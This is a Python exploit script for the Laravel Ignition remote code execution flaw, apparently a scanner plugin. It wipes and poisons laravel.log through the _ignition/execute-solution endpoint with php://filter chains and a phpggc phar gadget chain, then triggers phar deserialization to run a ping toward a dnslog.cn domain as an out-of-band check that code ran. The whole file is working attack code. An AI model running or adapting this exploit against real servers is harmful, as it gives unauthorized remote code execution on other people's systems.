import base64
import os
import time

import requests
import random

session = requests.Session()


def getdomain():
    try:
        ret = session.get("http://dnslog.cn/getdomain.php/?t=" + str(random.randint(100000, 999999)), timeout=10).text
    except Exception as e:
        print("get domain error:" + str(e))
        ret = "error"
        pass
    return ret


def getdnshost():
    reverhost = ""
    try:
        domain = getdomain()
        if domain == "error":
            print("get domain error")
        else:
            reverhost = domain
    except:
        pass
    return reverhost


def getrecords():
    try:
        ret = session.get("http://dnslog.cn/getrecords.php/?t=" + str(random.randint(100000, 999999)), timeout=10).text
    except Exception as e:
        print("get record error:" + str(e))
        ret = "error"
        pass

    return ret


def gen_payload(domain):
    try:
        os.system(
            f'php -d "phar.readonly=0" .\phpggc\phpggc Laravel/RCE5 "exec("""ping {domain}""")" --phar phar -o php://output > payload.txt')
        with open("payload.txt", 'rb') as f:
            data = f.read()
            result = base64.encodebytes(data).decode("UTF-8")
            result = "".join(['=' + hex(ord(i))[2:] + '=00' for i in result]).upper()
            print(result)
    except Exception as e:
        print(e)
    return result


def clear_log(url, s):
    try:
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "username",
                "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
            }
        }
        s = s.post(url + "/_ignition/execute-solution", data=data, timeout=5)
    except  Exception as e:
        print(e)


def add_log_AA(url, s):
    try:
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "username",
                "viewFile": "AA"
            }
        }
        s.post(url + '/_ignition/execute-solution', data=data, timeout=5)
    except Exception as e:
        print(e)


def check(url, proxies, timeout):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        domain = getdnshost()
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        if domain:
            print(domain)
            session1 = requests.Session()
            clear_log(url, session1)
            poc = gen_payload(domain)
            data = {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                    "variableName": "username",
                    "viewFile": poc
                }
            }
            add_log_AA(url, session1)
            session1.post(url + "/_ignition/execute-solution", data=data, timeout=timeout)
            clear_log(url, session1)
            data2 = {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                    "variableName": "username",
                    "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
                }
            }
            exec = session.post(url + "/_ignition/execute-solution", data=data2, timeout=timeout)
            for i in range(1, 5):
                time.sleep(2)
                temp = getrecords()
                if domain in temp:
                    ret["success"] = True
                    break
    except Exception as e:
        print(e)
    return ret


def main(params):
    result = params.get('result', {})
    url = params.get('url', '')
    headers = params.get('headers', {})
    proxies = params.get('proxies', None)  # 代理
    timeout = params.get('timeout', 5)  # 超时时间
    result = check(url, proxies, timeout)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://192.168.160.201:8083/",
    }
    print(main(params))
